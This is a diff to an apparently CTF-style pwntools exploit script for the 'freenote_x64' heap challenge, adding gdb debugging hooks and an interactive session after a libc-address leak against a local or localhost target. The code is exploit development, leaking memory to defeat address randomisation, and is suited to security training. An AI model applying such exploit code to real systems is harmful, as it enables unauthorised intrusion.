@@ -6,6 +6,7 @@ from pwn import *
 from time import sleep
 import sys
 context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
     io = process("./freenote_x64")
@@ -16,6 +17,10 @@ else:
     io = remote("localhost", 9999)
     elf = ELF("./freenote_x64")
     libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
+
+def DEBUG():
+    raw_input("DEBUG: ")
+    gdb.attach(io)
 
 def listNote():
     io.sendlineafter("choice: ", "1")
@@ -41,9 +46,9 @@ if __name__ == "__main__":
     delNote(0)
 
     newNote(8, "1234567")
+    DEBUG()
     listNote()
     libc_base = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00"))
     info("libc_base -> 0x%x" % libc_base)
-
-    
-
+    io.interactive()
+    io.close()
